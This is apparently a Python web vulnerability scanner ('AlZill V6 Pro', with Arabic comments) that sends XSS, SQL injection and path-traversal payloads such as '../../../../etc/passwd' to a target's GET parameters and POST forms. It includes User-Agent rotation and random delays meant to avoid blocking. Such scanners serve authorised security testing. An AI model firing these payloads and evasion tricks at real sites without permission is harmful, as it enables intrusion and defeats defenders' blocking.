#!/usr/bin/env python3
"""
Advanced Input Monitor - AlZill V6 Pro
Tests GET/POST parameters for XSS, SQLi, LFI with enhanced verification
Features: Unescaped character detection | Time-based comparison | Header reflection | Session protection
"""

import requests
import time
import random
import re
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
from termcolor import cprint
from difflib import SequenceMatcher

INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"


class InputMonitor:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.session = None
        self._init_session()
        self.findings = []
        self.baseline_responses = {}  # لتخزين baseline للمقارنة
        self.request_count = 0
        
        # HTML entities patterns للتحقق من التشفير
        self.html_entities = {
            '&lt;': '<', '&gt;': '>', '&quot;': '"', '&#39;': "'",
            '&apos;': "'", '&amp;': '&', '&#x3C;': '<', '&#x3E;': '>'
        }
        
        # أنماط أخطاء SQL
        self.sql_error_patterns = [
            "sql syntax", "mysql_fetch", "ora-00933", "ora-00936",
            "postgresql error", "pg::error", "sqlite3", "sqlite_error",
            "unclosed quotation mark", "microsoft ole db", "odbc driver",
            "syntax error", "division by zero", "column not found",
            "table not found", "database error"
        ]
        
        # رموز XSS الخطيرة
        self.xss_dangerous_chars = ['<', '>', '"', "'", '(', ')', '{', '}']

    def _init_session(self):
        """Initialize session with proper headers"""
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.session.verify = False
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def _rotate_user_agent(self):
        """Rotate User-Agent to avoid blocking"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        ]
        self.session.headers.update({'User-Agent': random.choice(user_agents)})

    def _random_delay(self):
        """Random delay to avoid detection"""
        time.sleep(random.uniform(0.3, 0.8))

    # ============================================================
    # ENHANCED XSS CONFIRMATION (مع التحقق من التشفير)
    # ============================================================
    
    def _confirm_xss(self, html: str, payload: str) -> bool:
        """
        تأكيد XSS - التحقق من أن البايلود لم يتم تشفيره
        """
        # 1. التحقق من وجود البايلود في الاستجابة
        if payload not in html:
            return False
        
        # 2. التحقق من أن الرموز الخطيرة لم يتم تشفيرها
        for entity, decoded in self.html_entities.items():
            if entity in html and decoded in payload:
                # الرمز مشفر -> ليس ثغرة حقيقية
                if self.verbose:
                    cprint(f"    [!] Payload encoded: {entity} found", WARNING)
                return False
        
        # 3. التحقق من وجود وسوم script غير مشفرة
        if '<script>' in payload and '&lt;script&gt;' not in html:
            if '<script>' in html.lower():
                return True
        
        # 4. التحقق من وجود event handlers
        if 'onerror' in payload.lower() and 'onerror=' in html.lower():
            if '&lt;' not in html:
                return True
        
        # 5. التحقق من وجود علامات SVG
        if '<svg' in payload.lower() and '&lt;svg' not in html.lower():
            if '<svg' in html.lower():
                return True
        
        # 6. التحقق من وجود JavaScript protocol
        if 'javascript:' in payload.lower() and 'javascript:' in html.lower():
            if '&#' not in html:
                return True
        
        return False

    # ============================================================
    # ENHANCED SQLi CONFIRMATION (مع Time-based comparison)
    # ============================================================
    
    def _get_baseline_time(self, url: str, param: str, original_value: str) -> float:
        """Get baseline response time for comparison"""
        times = []
        for i in range(3):
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [original_value]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                start = time.time()
                self.session.get(test_url, timeout=10, allow_redirects=False)
                elapsed = time.time() - start
                times.append(elapsed)
                time.sleep(0.5)
            except:
                pass
        
        return sum(times) / len(times) if times else 1.0

    def _confirm_sqli(self, resp, payload: str, baseline_time: float = None) -> bool:
        """
        تأكيد SQLi - Error-based + Time-based مع مقارنة
        """
        # 1. Error-based detection
        html_lower = resp.text.lower()
        for error in self.sql_error_patterns:
            if error in html_lower:
                if self.verbose:
                    cprint(f"    [!] SQL error detected: {error}", WARNING)
                return True
        
        # 2. Time-based detection (محسن)
        if 'sleep' in payload.lower() or 'delay' in payload.lower() or 'waitfor' in payload.lower():
            elapsed = resp.elapsed.total_seconds()
            
            # استخراج الوقت المتوقع من البايلود
            expected_delay = 0
            sleep_match = re.search(r'SLEEP\((\d+)\)|WAITFOR DELAY \'00:00:(\d+)\'|pg_sleep\((\d+)\)', payload, re.IGNORECASE)
            if sleep_match:
                expected_delay = int(sleep_match.group(1) or sleep_match.group(2) or sleep_match.group(3) or 0)
            
            # مقارنة مع baseline إذا كان متاحاً
            if baseline_time:
                time_diff = elapsed - baseline_time
                if expected_delay > 0 and time_diff >= expected_delay * 0.8:
                    if self.verbose:
                        cprint(f"    [!] Time-based injection: {elapsed:.2f}s vs baseline {baseline_time:.2f}s (diff: {time_diff:.2f}s)", SUCCESS)
                    return True
            else:
                # بدون baseline، نستخدم حد 5 ثوانٍ
                if expected_delay >= 5 and elapsed >= 4:
                    return True
        
        return False

    # ============================================================
    # LFI CONFIRMATION (Enhanced)
    # ============================================================
    
    def _confirm_lfi(self, html: str) -> bool:
        """تأكيد LFI - البحث عن أنماط حقيقية"""
        lfi_patterns = [
            r'root:x:[0-9]+:[0-9]+:',  # /etc/passwd
            r'daemon:x:[0-9]+:[0-9]+:',  # /etc/passwd
            r'\[extensions\]',  # win.ini
            r'\[fonts\]',  # win.ini
            r'127\.0\.0\.1\s+localhost',  # /etc/hosts
            r'<\\?php',  # PHP source
            r'PD9waHA',  # Base64 PHP
            r'USER=',  # Environment variables
            r'HOME=',  # Environment variables
            r'PATH=',  # Environment variables
        ]
        
        for pattern in lfi_patterns:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        return False

    # ============================================================
    # HEADER REFLECTION CHECK (لثغرات Header Injection)
    # ============================================================
    
    def _check_header_reflection(self, response, param: str, payload: str) -> bool:
        """Check if payload is reflected in response headers"""
        test_marker = f"ALZILL_HEADER_{random.randint(1000, 9999)}"
        
        for header_name, header_value in response.headers.items():
            if test_marker in header_value or payload[:20] in header_value:
                if self.verbose:
                    cprint(f"    [!] Payload reflected in header: {header_name}", WARNING)
                return True
        
        # Check for Set-Cookie injection
        set_cookie = response.headers.get('Set-Cookie', '')
        if payload[:20] in set_cookie:
            return True
        
        return False

    # ============================================================
    # SESSION PROTECTION (تجنب حظر الجلسة)
    # ============================================================
    
    def _check_session_alive(self, url: str) -> bool:
        """Check if session is still alive, reinitialize if needed"""
        try:
            test_response = self.session.get(url, timeout=5, allow_redirects=False)
            if test_response.status_code in [403, 429, 503]:
                if self.verbose:
                    cprint(f"    [!] Session may be blocked (Status {test_response.status_code}), reinitializing...", WARNING)
                self._init_session()
                self._rotate_user_agent()
                return False
            return True
        except:
            self._init_session()
            return False

    # ============================================================
    # MAIN SCANNING FUNCTIONS
    # ============================================================
    
    def scan(self, url, verbose=False):
        """Main function compatible with AlZill"""
        self.verbose = verbose
        
        cprint("\n" + "="*70, HIGHLIGHT)
        cprint("[INPUT MONITOR] AlZill V6 Pro - Advanced Input Security Testing", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, HIGHLIGHT)
        cprint("[*] Features: XSS (Unescaped detection) | SQLi (Time-based comparison) | LFI | Header injection", "yellow")
        cprint("[*] Protection: Session rotation | Random delays | User-Agent rotation", "yellow")
        
        # 1. Test GET parameters
        self._test_get(url)
        
        # 2. Test POST forms
        self._test_post(url)
        
        # 3. Report
        self._display_results()
        
        return len(self.findings) > 0

    def _test_get(self, url):
        """Test GET parameters"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            if self.verbose:
                cprint("[!] No GET parameters", WARNING)
            return
        
        cprint(f"\n[GET] Testing {len(params)} parameter(s)", INFO)
        
        for param in params:
            original_value = params[param][0]
            
            # Get baseline time for SQLi
            baseline_time = self._get_baseline_time(url, param, original_value)
            
            for vuln_type, payloads in self._payloads().items():
                for payload in payloads[:15]:  # limit for speed
                    self.request_count += 1
                    self._random_delay()
                    
                    # Rotate user-agent occasionally
                    if self.request_count % 10 == 0:
                        self._rotate_user_agent()
                    
                    # Check session health
                    if self.request_count % 20 == 0:
                        self._check_session_alive(url)
                    
                    test_url = self._build_url(parsed, param, payload)
                    
                    if self._test_and_exploit(test_url, param, "GET", vuln_type, payload, baseline_time):
                        break  # stop after first finding per param

    def _test_post(self, url):
        """Test POST forms"""
        try:
            self._random_delay()
            resp = self.session.get(url, timeout=8, allow_redirects=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                if self.verbose:
                    cprint("[!] No POST forms found", WARNING)
                return
            
            cprint(f"\n[POST] Testing {len(forms)} form(s)", INFO)
            
            for form in forms:
                action = urljoin(url, form.get('action', ''))
                method = form.get('method', 'get').lower()
                
                if method != 'post':
                    continue
                
                inputs = {}
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name:
                        inputs[name] = inp.get('value', '')
                
                if not inputs:
                    continue
                
                for param in inputs:
                    for vuln_type, payloads in self._payloads().items():
                        for payload in payloads[:10]:
                            self.request_count += 1
                            self._random_delay()
                            
                            data = inputs.copy()
                            data[param] = payload
                            
                            if self._test_and_exploit_post(action, param, vuln_type, payload, data):
                                break  # stop after first finding per param
                        
        except Exception as e:
            if self.verbose:
                cprint(f"[!] POST extraction error: {e}", WARNING)

    def _test_and_exploit(self, url, param, method, vuln_type, payload, baseline_time=None):
        """Test and actually exploit if possible"""
        try:
            # Use allow_redirects=False for most tests, but check redirects for XSS
            allow_redirects = (vuln_type == "XSS")
            resp = self.session.get(url, timeout=8, allow_redirects=allow_redirects)
            
            # Check header reflection
            if self._check_header_reflection(resp, param, payload):
                self.findings.append({
                    'type': f'{vuln_type} (Header Reflection)',
                    'param': param,
                    'method': method,
                    'payload': payload[:50]
                })
                cprint(f"     {vuln_type} confirmed via header in {param} ({method})", ERROR)
                return True
            
            # Exploitation logic per type
            if vuln_type == "XSS" and self._confirm_xss(resp.text, payload):
                self.findings.append({
                    'type': 'XSS',
                    'param': param,
                    'method': method,
                    'payload': payload[:50]
                })
                cprint(f"     XSS confirmed in {param} ({method})", ERROR)
                return True
                
            elif vuln_type == "SQLi" and self._confirm_sqli(resp, payload, baseline_time):
                self.findings.append({
                    'type': 'SQL Injection',
                    'param': param,
                    'method': method,
                    'payload': payload[:50]
                })
                cprint(f"     SQLi confirmed in {param} ({method})", ERROR)
                return True
                
            elif vuln_type == "LFI" and self._confirm_lfi(resp.text):
                self.findings.append({
                    'type': 'LFI',
                    'param': param,
                    'method': method,
                    'payload': payload[:50]
                })
                cprint(f"     LFI confirmed in {param} ({method})", ERROR)
                return True
                
        except Exception as e:
            if self.verbose:
                cprint(f"    [!] Error testing {param}: {e}", WARNING)
        
        return False

    def _test_and_exploit_post(self, url, param, vuln_type, payload, data):
        """Test POST forms and exploit"""
        try:
            self._random_delay()
            resp = self.session.post(url, data=data, timeout=8, allow_redirects=False)
            
            if vuln_type == "XSS" and self._confirm_xss(resp.text, payload):
                self.findings.append({
                    'type': 'XSS',
                    'param': param,
                    'method': 'POST',
                    'payload': payload[:50]
                })
                cprint(f"     XSS confirmed in {param} (POST)", ERROR)
                return True
                
            elif vuln_type == "SQLi" and self._confirm_sqli(resp, payload):
                self.findings.append({
                    'type': 'SQL Injection',
                    'param': param,
                    'method': 'POST',
                    'payload': payload[:50]
                })
                cprint(f"     SQLi confirmed in {param} (POST)", ERROR)
                return True
                
            elif vuln_type == "LFI" and self._confirm_lfi(resp.text):
                self.findings.append({
                    'type': 'LFI',
                    'param': param,
                    'method': 'POST',
                    'payload': payload[:50]
                })
                cprint(f"     LFI confirmed in {param} (POST)", ERROR)
                return True
                
        except Exception as e:
            if self.verbose:
                cprint(f"    [!] Error testing POST {param}: {e}", WARNING)
        
        return False

    def _display_results(self):
        """Display scan results"""
        cprint("\n" + "="*70, HIGHLIGHT)
        cprint("📊 INPUT MONITOR RESULTS", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, HIGHLIGHT)
        
        if self.findings:
            cprint(f"\n[!!!] Confirmed {len(self.findings)} vulnerability(ies):", ERROR, attrs=['bold'])
            
            # Group by type
            by_type = {}
            for f in self.findings:
                by_type.setdefault(f['type'], []).append(f)
            
            for vuln_type, items in by_type.items():
                cprint(f"\n  {vuln_type}:", ERROR)
                for item in items[:5]:
                    cprint(f"    └─ {item['param']} ({item['method']})", WARNING)
                    if self.verbose:
                        cprint(f"        Payload: {item['payload']}", INFO)
            
            if len(self.findings) > 5:
                cprint(f"\n  ... and {len(self.findings) - 5} more", WARNING)
        else:
            cprint(f"\n[✓] No vulnerabilities confirmed", SUCCESS)
            cprint(f"    All inputs passed security checks", INFO)
        
        cprint(f"\n[*] Total requests sent: {self.request_count}", INFO)
        cprint("\n" + "="*70 + "\n", HIGHLIGHT)

    # ============================================================
    # HELPERS
    # ============================================================
    
    def _build_url(self, parsed, param, payload):
        """Build URL with payload"""
        params = parse_qs(parsed.query)
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _payloads(self):
        """Get test payloads"""
        return {
            "XSS": [
                "<script>alert('XSS')</script>",
                "\"><img src=x onerror=alert(1)>",
                "'><svg/onload=alert(1)>",
                "javascript:alert('XSS')",
                "<ScRiPt>alert(1)</ScRiPt>",
                "'';!--\"<XSS>=&{()}",
            ],
            "SQLi": [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--",
                "' AND SLEEP(5)--",
                "1' AND 1=1--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND pg_sleep(5)--",
            ],
            "LFI": [
                "../../../../etc/passwd",
                "../../../../windows/win.ini",
                "php://filter/convert.base64-encode/resource=index.php",
                "../../../../../../etc/passwd%00",
            ]
        }


# ============================================================
# AlZill compatibility functions
# ============================================================

def run_input_monitor(url):
    """Legacy function"""
    monitor = InputMonitor(verbose=True)
    return monitor.scan(url)


def scan(url, verbose=False):
    """Main scan function"""
    monitor = InputMonitor(verbose=verbose)
    return monitor.scan(url, verbose)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
        verbose = '--verbose' in sys.argv or '-v' in sys.argv
        scan(target, verbose=verbose)
    else:
        print("Usage: python input_monitor.py <target_url> [--verbose]")
        print("Example: python input_monitor.py https://example.com/search?q=test --verbose")